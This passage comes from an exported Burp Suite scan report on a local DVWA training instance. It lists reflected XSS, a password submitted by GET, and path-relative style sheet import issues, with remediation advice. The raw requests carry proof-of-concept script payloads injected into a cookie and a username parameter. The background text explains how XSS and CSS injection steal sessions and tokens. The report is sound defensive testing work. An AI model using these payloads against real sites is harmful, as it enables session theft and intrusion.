<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">xpgx1'%3e%3cscript%3ealert(1)%3c%2fscript%3exxuc3</span>; PHPSESSID=h4228m47v3jkvbmhus0jeth2cv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:32 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=h4228m47v3jkvbmhus0jeth2cv; path=/<br>Set-Cookie: security=low<br>Content-Length: 4737<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=csrf&amp;security=low<span class="HIGHLIGHT">xpgx1'&gt;&lt;script&gt;alert(1)&lt;/script&gt;xxuc3</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="20.3">20.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400300_passwordsubmittedusinggetmethod">Password submitted using GET method</a></span>
<br><a class="PREVNEXT" href="#20.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#20.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_low_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Low</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>http://localhost:7878/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change</li></ul>The form contains the following password fields:<ul><li>password_new</li><li>password_conf</li></ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method="POST"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.
</p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/37.html">CAPEC-37: Retrieve Embedded Sensitive Data</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=sjhvciv85o6upmpogbotaiukpc<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:28 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;form action="#" method="GET"&gt;</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;New password:&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password_new"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;input type="password" AUTOCOMPLETE="off" name="password_conf"&gt;</span>&lt;br /&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="20.4">20.4.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#20.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#20.5">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=nqb5pembo8ld1v8v07q12of6el<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:28 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/<span class="HIGHLIGHT">index.php/ekyfh1/affq09/e2mxnh/</span>?password_new=password&amp;password_conf=password&amp;Change=Change HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=nqb5pembo8ld1v8v07q12of6el<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:28 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4494<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;/title&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" /&gt;</span><br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;link rel="icon" type="\image/ico" href="../../favicon.ico" /&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Request 3</h2>
<div class="rr_div"><span>GET <span class="HIGHLIGHT">/dvwa/vulnerabilities/csrf/index.php/ekyfh1/dvwa/css/main.css</span> HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=nqb5pembo8ld1v8v07q12of6el<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csrf/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 3</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:28 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4466<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="20.5">20.5.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00400c00_inputreturnedinresponsereflected">Input returned in response (reflected)</a></span>
<br><a class="PREVNEXT" href="#20.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#21.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csrf/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">7x3pz4zeq3</span>; PHPSESSID=h4228m47v3jkvbmhus0jeth2cv<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:39:31 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=h4228m47v3jkvbmhus0jeth2cv; path=/<br>Set-Cookie: security=low<br>Content-Length: 4683<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Cross Site Request Forgery (CSRF) :: Damn Vulnerable Web <br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=csrf&amp;security=low<span class="HIGHLIGHT">7x3pz4zeq3</span>&amp;locale=en' )"&gt; &lt;input type="button" value="View Source" class="popup_button" id='source_button' data-source-url='../../vulnerabilities/view_source.php?id=csrf&amp;security=low<span class="HIGHLIGHT">7x3pz4zeq3</span>' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="21">21.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csrf/test_credentials.php</span>
<br><a class="PREVNEXT" href="#20">Previous</a>
&nbsp;<a class="PREVNEXT" href="#22">Next</a>
<br>
<span class="BODH1" id="21.1">21.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#20.5">Previous</a>
&nbsp;<a class="PREVNEXT" href="#21.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csrf/test_credentials.php</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>username</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>oo4wt&lt;script&gt;alert(1)&lt;/script&gt;gmyku</b> was submitted in the username parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
